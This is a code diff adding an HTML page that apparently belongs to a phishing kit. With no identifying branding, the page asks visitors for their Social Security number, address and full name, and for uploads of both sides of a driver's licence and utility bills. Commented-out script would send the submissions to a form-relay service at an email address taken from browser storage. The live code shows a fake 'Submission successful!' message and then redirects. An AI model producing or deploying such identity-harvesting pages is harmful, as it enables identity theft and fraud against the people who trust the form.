@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable= 0, maximum-scale=1.0" />
+    <!-- color for top -->
+	<meta name="msapplication-TileColor" content="#3498db">
+	<meta name="msapplication-config" content="/templates/1st_comm/images/icons/browserconfig.xml">
+	<meta name="theme-color" content="#013c4c">
+	<meta name="apple-mobile-web-app-status-bar-style" content="#013c4c">
+    <title>...</title>
+
+    <style>
+        .textDiv {
+            margin: 20% 2% 0 2%;
+        }
+        .formDiv {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10% 2%;
+            height: 50vh;
+            width: 100%;
+        }
+        form {
+            width: 100%;
+        }
+        input {
+            margin: 0;
+            width: 90%;
+            height: 40px;
+        }
+        input:focus {
+            outline: none; /* Ensures no outline appears when the field is focused */
+            border: none; /* Optional: Removes border if desired */
+        }
+        .inputForm {
+            margin: 2% 0;
+        }
+        form label {
+            background-color: black;
+            color: white;
+            padding: 5% 10%;
+            font-size: 14px;
+            width: 90%;
+        }
+
+        form button {
+            background-color: black;
+            color: white;
+            padding: 3% 0;
+            width: 100%;
+            /* margin: 20px 0; */
+        }
+    </style>
+</head>
+<body>
+    <div class="textDiv">
+        <p>Submit your social security number and upload 
+            front and back of your driver's licence
+        </p>
+    </div>
+    <div class="formDiv">
+        
+        <form action="" method="POST" id="myForm">
+            <input class="inputForm" type="text" name="name" placeholder="Full Name">
+            <input class="inputForm" type="text" name="address" placeholder="Address">
+            <input class="inputForm" type="number" name="SSN" placeholder="Social Security Number">
+          
+            <div class="inputForm">
+              <label for="dlFront">Upload Driver's license (FRONT)</label>
+              <input type="file" name="dl front" id="dlFront">
+            </div>
+            <div class="inputForm">
+              <label for="dlBack">Upload Driver's license (BACK)</label>
+              <input type="file" name="dl back" id="dlBack">
+            </div>
+            <div class="inputForm">
+              <label for="utilityBill">Utility Bills</label>
+              <input type="file" name="utility bill" id="utilityBill">
+            </div>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://yourdomain.co/thanks.html">
+          
+            <button id="submitBtn" type="button">SUBMIT</button>
+          </form>
+          
+    </div>
+
+
+    <script>
+        // const realEmail = localStorage.getItem('realEmail');
+        // const realEmail = sessionStorage.getItem('realEmail');
+        // console.log(realEmail)
+        // document.addEventListener('DOMContentLoaded', ()=> {
+        //     const form = document.getElementById('myForm');
+        //     const email = localStorage.getItem('realEmail');
+        //     form.action = `https://formsubmit.co/${encodeURIComponent(email)}`
+        // })
+
+        const submitBtn = document.getElementById('submitBtn');
+const form = document.getElementById('myForm');
+
+submitBtn.addEventListener('click', () => {
+  const inputs = document.querySelectorAll('.inputForm input');
+  let isValid = true;
+
+  // Validate each input field
+  inputs.forEach((input) => {
+    if (input.type !== 'file' && input.value.trim() === '') {
+      alert(`The field "${input.placeholder}" cannot be empty.`);
+      isValid = false;
+    } else if (input.type === 'file' && !input.files.length) {
+      alert(`Please upload a file for "${input.previousElementSibling.textContent}".`);
+      isValid = false;
+    }
+  });
+
+  if (isValid) {
+    alert('Submission successful!');
+    setTimeout(() => {
+      window.location.href = "/dashboard.html"; // Redirect URL
+    }, 1000); // 1 second delay
+  }
+});
+
+        
+    </script>
+</body>
+</html>
